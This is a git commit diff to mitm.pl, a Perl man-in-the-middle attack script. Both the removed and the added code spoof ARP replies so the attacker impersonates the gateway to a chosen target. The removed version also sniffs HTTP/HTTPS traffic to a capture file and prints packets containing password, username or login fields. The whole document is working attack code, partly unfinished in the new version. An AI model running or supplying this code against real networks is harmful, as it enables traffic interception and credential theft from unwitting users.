cf2b8cd75379ae2632a5af2a110101e1fa1ded6e
Abhishek <abhihimself@gmail.com>
2015-08-21 19:02:27 +0530

    got so far

--- mitm.pl
+++ mitm.pl
@@ -5,68 +5,87 @@ use NetPacket::TCP;        # packet disassembly
 use Net::Pcap;             # sniffing
 use Net::ARP;              # craft,send ARP to target
 use Net::Frame::Device;    # get local MAC
+use Net::Frame::Dump::Online;
+use Net::Frame::Simple;
 
-my $usage     = "perl mitm.pl <target IP><target MAC><gateway IP>\n";
-my $targetIP  = shift || die $usage;
-my $targetMAC = shift || die $usage;
-my $gatewayIP = shift || die $usage;
-my ( $net, $mask, $filter, $err ) = "" x 4;
-my $dev = pcap_lookupdev( \$err );
-my $myDevProp = Net::Frame::Device->new( dev => $dev );    # get my MAC
+#################getting target info#####################
+my $target_ip  = shift;
+my $target_mac = shift;
+my $gateway_ip= shift;
+#####getting local info###############################
+my ( $dev, $err, $net, $mask );
+$dev = pcap_lookupdev( \$err );
+
+
+my $dev_info   = Net::Frame::Device->new( dev => $dev );
+my $native_mac = $dev_info->mac();
+my $native_ip  = $dev_info->ip();
 pcap_lookupnet( $dev, \$net, \$mask, \$err );
-my $pcap = pcap_open_live( $dev, 65535, 1, 4000, \$err );
-pcap_compile( $pcap, \$filter, "port 80 or port 443 or arp", 1, $mask )
-  && die "cannot compile filter";
-pcap_setfilter( $pcap, $filter ) && die "cannot set filter";
-my $dumper = pcap_dump_open( $pcap, "output.cap" );
-print "Sending initial ARP to poison victim.\n";
-&sendARP;    # send the ARP request
-print "Listening for port 80, 443 and ARP...\n";
-pcap_loop( $pcap, -1, \&cap, 0 );
 
-sub cap {
-	my ( $user_data, $hdr, $pkt ) = @_;
-	my $type = sprintf( "%02x%02x", unpack( "x12 C2", $pkt ) );
-	if ( $type eq "0806" ) {    # we have an ARP
+print "got so far";
+###########################################################
+my $dumper = Net::Frame::Dump::Online->new( dev => $dev );
+my $filterStr = "(arp)&&(ether dst " . $dev_info->mac . ")&&(ether src
+" . $target_mac . ")";
 
-		# is it ours?
-		if (
-			sprintf( "%02x:%02x:%02x:%02x:%02x:%02x", unpack( "C6", $pkt ) ) eq
-			$myDevProp->mac )
-		{
-			if ( sprintf( "%02x%02x", unpack( "x20 C2", $pkt ) ) eq "0001" )
-			{                   # RequestARP
-				print "[-] got request from target, sending reply\n";
-				&sendARP;       # opCode 1 (reply)
-				return;
-			}
-		}
+my $pcap = Net::Frame::Dump::Online->new(
+	dev => $dev,
+
+	# network device
+	filter => $filterStr,
+
+	# add attackers MAC
+	promisc => 0,
+
+	# non promiscuous
+	unlinkOnStop => 1,
+
+	# deletes temp files
+	timeoutOnNext => 1000
+
+	  # waiting for ARP responses
+);
+$pcap->start;
+
+send_arp_spoof();
+
+#while (1) {
+
+	#keep sending arp spoof
+
+#}
+
+sub send_arp_spoof {
+	Net::ARP::send_packet(
+		$dev,           # Device
+		$gateway_ip,     # Source IP
+		$target_ip,     # Destination IP
+		$native_mac,    # Source MAC
+		$target_mac,    # Destinaton MAC
+		'reply'
+	);                  # ARP operation
+	
+}
+
+keep_spoofing();
+sub keep_spoofing {
+
+until($pcap->timeout){
+	
+	if(my $next=$pcap->next)
+{
+my $fref = Net::Frame::Simple->newFromDump($next);
+if($fref->ref->{ARP}->opCode == 1){
+	print "Got the request. Replying by arp";
+	send_arp_spoof();
 	}
-	else {                      # else should be 80 or 443 ports:
-		pcap_dump( $dumper, $hdr, $pkt );    # haven't died, so save it
-		my $len    = length($pkt);
-		my $string = "";
-		for ( my $i = 0 ; $i <= $len ; $i++ ) {
-			$string .= pack 'H*',
-			  unpack( "H2", substr( $pkt, $i, 1 ) );    # per byte
-		}
-		$string =~ s/\R/ /g;
-		print "\n", $string, "\n"
-		  if ( $string =~ m/passw(ord)?=/i
-			or $string =~ m/user(name)?=/i
-			or $string =~ m/login=/i );
-	}
+	
+}
+	
+	
+}
+return;
 }
 
-sub sendARP {
-	Net::ARP::send_packet( $dev, $gatewayIP, $targetIP, $myDevProp->mac,
-		$targetMAC, "reply" )
-	  || die "cannot send spoofed ARP reply packet\n";
-	return;
-}
+END{ $pcap->stop if($pcap); print "Exiting.\n"; }
 
-END {
-	pcap_close($pcap)        if ($pcap);
-	pcap_dump_close($dumper) if ($dumper);
-	print "Exiting.\n";
-}
